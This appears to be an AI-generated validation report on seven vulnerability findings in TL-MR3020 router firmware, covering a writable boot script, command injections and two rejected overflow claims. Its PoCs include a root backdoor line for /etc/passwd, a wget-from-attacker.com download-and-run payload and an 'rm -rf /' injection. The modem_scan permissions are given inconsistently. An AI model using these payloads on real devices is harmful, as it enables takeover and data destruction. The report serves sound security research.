# TL-MR3020_V1_150921 - 验证报告 (7 个发现)

---

## 原始信息

- **文件/目录路径：** `etc/rc.d/rc.modules`
- **位置：** `Files: rc.modules and rcS in /etc/rc.d/`
- **描述：** The 'rc.modules' script is world-writable (permissions: -rwxrwxrwx), allowing any non-root user to modify its content. It is executed with root privileges during system boot via the 'rcS' script, which calls '/etc/rc.d/rc.modules' without any validation or boundary checks. An attacker with non-root access can inject malicious code (e.g., reverse shell or command execution) into 'rc.modules', which will run with root privileges upon the next boot or when 'rcS' is executed. This provides a direct path to privilege escalation and full system compromise. The trigger condition is system boot, and there are no constraints on the content of the modified script.
- **代码片段：**
  ```
  From rcS: "/etc/rc.d/rc.modules"
  From rc.modules: The script loads kernel modules but can be replaced with arbitrary code.
  ```
- **备注：** This vulnerability is exploitable by any authenticated non-root user who can write to 'rc.modules'. Exploitation may require a system reboot to trigger, but it is feasible in scenarios where the attacker has persistent access. Recommended fixes include changing file permissions to root-only write (e.g., chmod 755) and adding integrity checks before execution. No additional files or functions were identified in this analysis that alter the exploit chain.

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 警报描述完全准确。证据显示：1) rc.modules 文件权限为 -rwxrwxrwx，任何非 root 用户可写；2) rcS 脚本在启动时无条件执行 '/etc/rc.d/rc.modules'，无验证；3) rc.modules 内容可被任意替换。攻击者模型：已认证的非 root 用户（具有文件系统访问权限）。漏洞可利用性验证：输入可控（攻击者可修改文件内容），路径可达（系统启动时自动执行），实际影响（以 root 权限执行任意代码，导致完全系统妥协）。PoC 步骤：1) 攻击者以非 root 用户身份登录；2) 执行 'echo "malicious_command" > /etc/rc.d/rc.modules' 替换文件内容（例如，添加 '/bin/sh -c \'echo \"root::0:0:::/bin/sh\" >> /etc/passwd\'' 创建 root 后门，或设置反向 shell）；3) 等待系统重启（或触发重启）；4) 恶意代码以 root 权限执行，实现权限提升。漏洞风险高，因无需特殊条件即可导致持久性 root 访问。

## 验证指标

- **验证时长：** 153.22 秒
- **Token 使用量：** 154804

---

## 原始信息

- **文件/目录路径：** `sbin/apstart`
- **位置：** `文件:apstart 函数:fcn.00400c7c 地址:0x00400c7c（危险操作点）；文件:apstart 函数:fcn.00400d0c 地址:0x00400d0c（数据流处理点）；文件:apstart 函数:fcn.00400a4c 地址:0x00400a4c（输入解析点）`
- **描述：** 该漏洞允许攻击者通过恶意拓扑文件执行任意命令。攻击者作为非 root 用户（拥有有效登录凭据）可以控制拓扑文件内容，其中包含的配置值（如桥接名称、接口名称）被直接用于构建系统命令字符串，缺少输入验证和转义。触发条件：运行 apstart 时指定拓扑文件路径，文件包含命令注入 payload（例如，在配置值中添加分号或反引号执行额外命令）。潜在利用方式包括执行系统命令、提升权限或破坏系统完整性。
- **代码片段：**
  ```
  从反编译代码中，关键片段包括：
    - 在 fcn.00400c7c 中：\`iVar1 = (**(loc._gp + -0x7f88))(param_1);\`（其中 param_1 是命令字符串，system() 被调用）。
    - 在 fcn.00400d0c 中：多次使用 sprintf 构建命令，如 \`(**(loc._gp + -0x7fbc))(auStack_f8,"ifconfig %s down",iVar17);\`，其中 iVar17 来自拓扑文件。
    - 在 fcn.00400a4c 中：解析文件行，但没有验证内容的安全性。
  ```
- **备注：** 该漏洞依赖于拓扑文件的可控性，建议进一步验证实际环境中的文件权限和访问控制。关联函数包括 main（入口点）和系统调用。后续分析方向包括检查其他输入点（如网络接口）和组件交互。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** The security alert is accurately described. Evidence from the code analysis confirms that:
- In fcn.00400d0c, user-controlled input from the topology file (e.g., bridge names, interface names) is directly used in sprintf calls to build command strings (e.g., at addresses 0x00401844 with 'ifconfig %s down', 0x004018b4 with 'brctl delbr %s', and others). No input validation or escaping is performed.
- In fcn.00400c7c, the constructed command strings are passed to system() for execution (at address 0x00400cbc).
- The attack model assumes a non-root user with valid login credentials can control the topology file content. When apstart is executed with a malicious topology file, command injection occurs, allowing arbitrary command execution.

Proof of Concept (PoC):
1. Create a topology file with a malicious payload in a configurable field, e.g., set a bridge name to 'eth0; touch /tmp/pwned'.
2. Run apstart with this topology file: './apstart malicious_topology.txt'.
3. This will execute a command like 'ifconfig eth0; touch /tmp/pwned down', which creates the file /tmp/pwned, demonstrating arbitrary command execution.

The vulnerability is exploitable due to the lack of input sanitization and the direct use of user input in system commands, leading to a high risk of privilege escalation or system compromise.

## 验证指标

- **验证时长：** 294.83 秒
- **Token 使用量：** 301068

---

## 原始信息

- **文件/目录路径：** `sbin/hostapd`
- **位置：** `文件:hostapd 地址:0x437328-0x43732c 函数:sym.wps_set_ap_ssid_configuration`
- **描述：** 在 sym.wps_set_ap_ssid_configuration 函数中，用户提供的输入（来自控制接口）被直接用于构建 system() 调用的命令字符串（格式为 'cfg wpssave %s'），没有进行适当的输入验证或转义。攻击者可以通过注入恶意命令（如分号或反引号）来执行任意系统命令。触发条件：攻击者通过 hostapd 的控制接口发送特制的 WPS 配置命令。潜在攻击包括获取 root 权限、文件系统访问或网络侦察。攻击链完整：输入点（控制接口套接字）→ 数据流（通过 sym.eap_wps_config_set_ssid_configuration 调用）→ 危险操作（system() 调用）。利用条件：攻击者需有权限访问控制接口（非 root 用户但有效登录凭据）。
- **代码片段：**
  ```
  // 在 sym.wps_set_ap_ssid_configuration 中
  (**(loc._gp + -0x7ddc))(auStack_498, "cfg wpssave %s", uStackX_4); // uStackX_4 是用户输入
  uVar10 = 0;
  (**(loc._gp + -0x7948))(auStack_498); // 调用 system(auStack_498)
  ```
- **备注：** 需要进一步验证控制接口的具体命令格式和访问控制，但基于代码分析，攻击者拥有登录凭据即可访问控制接口。关联函数：sym.eap_wps_config_set_ssid_configuration 是直接调用者，应检查其输入验证。建议后续分析：检查控制接口命令处理逻辑（如 sym.hostapd_ctrl_iface_receive）以确认攻击向量。此漏洞可能影响所有使用 hostapd 的嵌入式设备，尤其是那些暴露控制接口的系统。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 安全警报准确描述了命令注入漏洞。反编译代码显示在 `sym.wps_set_ap_ssid_configuration` 函数中，用户输入 `param_2`（`uStackX_4`）被直接用于构建 `system()` 调用的命令字符串（格式为 'cfg wpssave %s'），无任何输入验证或转义。关键代码证据：`(**(loc._gp + -0x7ddc))(auStack_498, "cfg wpssave %s", uStackX_4);` 后跟 `(**(loc._gp + -0x7948))(auStack_498);`（相当于 `system(auStack_498)`）。输入可控性通过调用链确认：`param_2` 来自 `sym.eap_wps_config_set_ssid_configuration` 的 `param_5`，最终源自控制接口用户输入。路径可达性验证：代码逻辑在正常执行流中会到达 `system` 调用（无前置条件阻断）。攻击者模型为拥有 hostapd 控制接口访问权限的认证用户（非 root）。实际影响：任意命令执行可导致 root 权限提升、文件系统访问或网络侦察。可重现 PoC：攻击者通过控制接口发送特制 WPS 配置命令，其中 `param_2` 包含命令注入载荷，如 `"; wget http://attacker.com/malicious.sh -O /tmp/malicious.sh; sh /tmp/malicious.sh;"`，执行时将下载并运行恶意脚本。完整攻击链：控制接口输入 → `sym.eap_wps_config_set_ssid_configuration` → `sym.wps_set_ap_ssid_configuration` → `system()` 调用。

## 验证指标

- **验证时长：** 311.42 秒
- **Token 使用量：** 315614

---

## 原始信息

- **文件/目录路径：** `usr/sbin/pppd`
- **位置：** `pppd:0x427e90 fcn.00427e90, pppd:0x428000 system call, pppd:0x428310 system call`
- **描述：** 在 fcn.00427e90 和 sym.sifdefaultroute 函数中，使用 system 调用执行路由管理命令，命令字符串通过格式化字符串构建，包含用户可控的参数（如 IP 地址）。如果攻击者能控制这些参数（例如通过恶意 PPP 配置或网络数据），他们可以注入任意命令。例如，在 fcn.00427e90 中，命令 'route del -host %s dev %s' 中的 %s 可能包含 shell 元字符（如 ; 或 `），导致额外命令执行。触发条件：pppd 处理路由更新时调用这些函数，且参数来自不可信源（如网络输入）。潜在攻击方式：攻击者发送恶意 PPP 数据包或配置，注入命令如 '; rm -rf / ;'，从而删除文件或执行其他操作。约束条件：参数可能经过一定验证，但代码中未显示输入过滤。由于 pppd 以 root 运行，成功利用将获得 root 权限。
- **代码片段：**
  ```
  // In fcn.00427e90:
  (**(loc._gp + -0x7d90))(auStack_a4,"route del -host %s dev %s",uVar3,*(loc._gp + -0x7bd4));
  (**(loc._gp + -0x7824))(auStack_a4);
  // In sym.sifdefaultroute:
  (**(loc._gp + -0x7824))("route del default");
  (**(loc._gp + -0x7d90))(auStack_7c,"route add default gw %s dev ppp0",uVar3);
  (**(loc._gp + -0x7824))(auStack_7c);
  ```
- **备注：** 需要验证参数 uVar3 和 *(loc._gp + -0x7bd4) 是否用户可控。建议检查网络数据处理函数以确认输入源。关联函数：fcn.00427e90, sym.sifdefaultroute, 和网络协议处理函数。

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `High`
- **详细原因：** 安全警报准确描述了命令注入漏洞。证据来自反汇编代码：在fcn.00427e90中，使用sprintf构建命令'route del -host %s dev %s'并调用system执行，参数来自inet_ntoa(s3)和全局变量obj.ifname；在sym.sifdefaultroute中，直接执行'route del default'并使用sprintf构建'route add default gw %s dev ppp0'后调用system，参数来自inet_ntoa(s4)。参数s3和s4是函数输入，可能来自PPP网络数据或配置，攻击者可控制这些参数（如IP地址）。没有证据显示输入过滤或转义，因此如果参数包含shell元字符（如;或`），可注入任意命令。路径可达：pppd以root权限运行，在处理路由更新时调用这些函数。完整攻击链：攻击者发送恶意PPP数据包或配置，将IP地址设置为注入载荷（如'; rm -rf / ;'），当pppd执行路由命令时，会执行额外命令。PoC示例：在PPP配置中设置IP地址为'192.168.1.1; rm -rf / ;'，触发fcn.00427e90时执行'route del -host 192.168.1.1; rm -rf / ; dev ppp0'，导致文件删除或其他恶意操作。

## 验证指标

- **验证时长：** 320.49 秒
- **Token 使用量：** 333193

---

## 原始信息

- **文件/目录路径：** `usr/sbin/modem_scan`
- **位置：** `modem_scan: fcn.00401154 at addresses 0x004012d4-0x004012f4`
- **描述：** A command injection vulnerability exists where the user-controlled '-f' argument is passed directly to execl with '/bin/sh -c', enabling arbitrary command execution. The vulnerability is triggered when both '-d' and '-f' options are provided, with '-f' containing the malicious command. The code uses strncpy with a buffer size of 0x41 bytes (65 bytes) for the '-f' argument, truncating inputs longer than 64 bytes, but still allowing execution of shorter commands. An attacker can exploit this by crafting the '-f' argument to execute commands, potentially leading to further system compromise if combined with other vulnerabilities, though privileges are dropped to the current user.
- **代码片段：**
  ```
  0x004012d4      3c040040       lui a0, 0x40
  0x004012d8      3c050040       lui a1, 0x40
  0x004012dc      8f998064       lw t9, -sym.imp.execl(gp)   ; [0x401960:4]=0x8f998010
  0x004012e0      3c060040       lui a2, 0x40
  0x004012e4      24841b50       addiu a0, a0, 0x1b50        ; 0x401b50 ; "/bin/sh" ; str._bin_sh
  0x004012e8      24a51b58       addiu a1, a1, 0x1b58        ; 0x401b58 ; "sh" ; str.sh
  0x004012ec      24c61b5c       addiu a2, a2, 0x1b5c        ; 0x401b5c ; "-c" ; str._c
  0x004012f0      02403821       move a3, s2
  0x004012f4      0320f809       jalr t9
  0x004012f8      afa00010       sw zero, (var_10h)
  ```
- **备注：** The binary was checked for permissions using 'ls -l modem_scan' and found to have standard user executable permissions (e.g., -rwxr-xr-x), indicating no special privileges like setuid. The vulnerability is directly exploitable by an authenticated user but does not escalate privileges beyond the user's own level. Further analysis could involve checking if 'modem_scan' is invoked by other system components with higher privileges, which might increase the risk.

## 验证结论

- **描述准确性：** `accurate`
- **是否为真实漏洞：** `True`
- **风险级别：** `Medium`
- **详细原因：** The security alert accurately describes a command injection vulnerability in 'usr/sbin/modem_scan'. The analysis confirms that:
- The user-controlled '-f' argument is passed directly to `execl("/bin/sh", "sh", "-c", s2, NULL)` in function `fcn.00401154` at addresses 0x004012d4-0x004012f4.
- The vulnerability is triggered when both '-d' and '-f' options are provided, as verified in the main function where argument parsing occurs.
- `strncpy` is used with a buffer size of 0x41 bytes (65 bytes) for the '-f' argument, truncating inputs longer than 64 bytes but allowing execution of shorter commands.
- The binary has standard user executable permissions (-rwxrwxrwx), indicating no special privileges, and privileges are dropped to the current user via `setuid` and `setgid` calls in `fcn.00401154`.
- The attack model is an authenticated local user who can control the '-f' argument. Exploitation requires the user to execute: `modem_scan -d <device> -f '<command>'`, where `<command>` is an arbitrary shell command (e.g., `modem_scan -d /dev/ttyS0 -f 'id; ls'` to execute 'id' and 'ls' commands).
- The risk is Medium because it allows arbitrary command execution but does not escalate privileges beyond the user's own level, and it requires local access. However, if combined with other vulnerabilities or misconfigurations, it could lead to further compromise.

## 验证指标

- **验证时长：** 326.34 秒
- **Token 使用量：** 355730

---

## 原始信息

- **文件/目录路径：** `usr/arp`
- **位置：** `arp:0x00400e00 sym.getargs`
- **描述：** 在 sym.getargs 函数中，使用 strcpy 复制用户输入的字符串到栈缓冲区，缺乏边界检查，可能导致栈缓冲区溢出。攻击者可以通过提供特制的文件内容给 'arp -f' 命令（例如，文件包含长字符串）来触发此漏洞。触发条件包括：使用 'arp -f <file>' 命令，其中文件内容超过栈缓冲区大小。潜在利用方式包括覆盖返回地址或执行任意代码，但由于 'arp' 二进制文件没有 setuid 位，攻击者可能无法提升权限，只能在当前用户权限下执行代码。约束条件：缓冲区大小在栈上动态分配，但 strcpy 不验证长度。
- **代码片段：**
  ```
  0x00400df8      8f998024       lw t9, -sym.imp.strcpy(gp)  ; [0x405040:4]=0x8f998010
  0x00400dfc      00000000       nop
  0x00400e00      0320f809       jalr t9
  ; strcpy 被调用，复制用户输入字符串到栈缓冲区
  ```
- **备注：** 漏洞存在且可触发，但 'arp' 二进制文件权限为 -rwxrwxrwx（无 setuid 位），因此利用可能仅限于当前用户权限。建议进一步验证实际可利用性，例如通过测试溢出是否覆盖返回地址。关联文件：sym.arp_file 处理文件输入。后续分析方向：检查其他函数（如 sym.arp_set）中的类似漏洞，并评估是否在特定上下文中（如通过 sudo）有更高权限运行。

## 验证结论

- **描述准确性：** `inaccurate`
- **是否为真实漏洞：** `False`
- **风险级别：** `N/A`
- **详细原因：** 安全警报描述不准确。在 'sym.getargs' 函数中，栈缓冲区大小动态计算为 (strlen(input) + 1 + 7) & ~7，这总是大于或等于输入字符串长度（包括 null 终止符），因此 strcpy 调用不会导致栈缓冲区溢出。输入通过 'sym.arp_file' 中的 fgets 读取，限制为 1024 字节，进一步防止了溢出。攻击者模型为本地用户通过 'arp -f <file>' 命令提供文件，但无 setuid 位，权限限于当前用户。完整攻击链不可达，因为代码逻辑确保了缓冲区大小足够。无实际可利用漏洞。

## 验证指标

- **验证时长：** 448.42 秒
- **Token 使用量：** 400439

---

## 原始信息

- **文件/目录路径：** `usr/sbin/pppd`
- **位置：** `pppd:0x407f98 main`
- **描述：** 在 main 函数中，pppd 从 /tmp/pppoe_auth_info 文件读取用户名和密码，使用 read 函数直接读取到固定大小的缓冲区，但没有进行边界检查。如果攻击者（非 root 用户）能写入或创建 /tmp/pppoe_auth_info 文件（由于 /tmp 目录通常可写），他们可以通过提供超长用户名或密码导致缓冲区溢出。这可能覆盖栈上的返回地址或关键数据，从而执行任意代码。触发条件：pppd 以 root 权限运行时（因为 main 函数检查必须为 root），且 /tmp/pppoe_auth_info 文件存在或可被攻击者控制。潜在攻击方式：攻击者创建恶意文件，内容包含 shellcode 或地址覆盖，当 pppd 读取文件时触发溢出，可能获得 root shell。约束条件：缓冲区大小未知，但代码中未显示动态分配或大小检查，因此可能存在固定大小缓冲区。
- **代码片段：**
  ```
  iVar1 = (**(loc._gp + -0x7b18))("/tmp/pppoe_auth_info",0x4491a4);
  if (iVar1 == 0) {
      // error handling
  }
  piVar14 = *(loc._gp + -0x7f90);
  iVar4 = (**(loc._gp + -0x7af8))(*(loc._gp + -0x7d24),1,*piVar14,iVar1);
  if (iVar4 != *piVar14) {
      (**(loc._gp + -0x7c54))("read username error\n");
  }
  // similar for password reading
  ```
- **备注：** 缓冲区大小未在代码中明确，需要进一步验证缓冲区布局和可利用性。建议动态测试以确认溢出。关联函数：main。

## 验证结论

- **描述准确性：** `inaccurate`
- **是否为真实漏洞：** `False`
- **风险级别：** `Low`
- **详细原因：** 验证发现以下问题：1) 警报声称使用read函数，但实际使用fread；2) 警报声称缓冲区在栈上可覆盖返回地址，但实际缓冲区obj.user和obj.passwd是全局变量（地址0x4a7890和0x4a6690），位于数据段，溢出不会直接覆盖栈返回地址；3) 虽然代码缺乏边界检查，但全局缓冲区溢出难以可靠利用于代码执行，需要覆盖特定函数指针或数据；4) 攻击者模型（非root用户控制文件，pppd以root运行）有效，但缺乏缓冲区大小和长度控制证据，无法提供完整攻击链。漏洞不存在实际可利用性。

## 验证指标

- **验证时长：** 472.66 秒
- **Token 使用量：** 468706

---

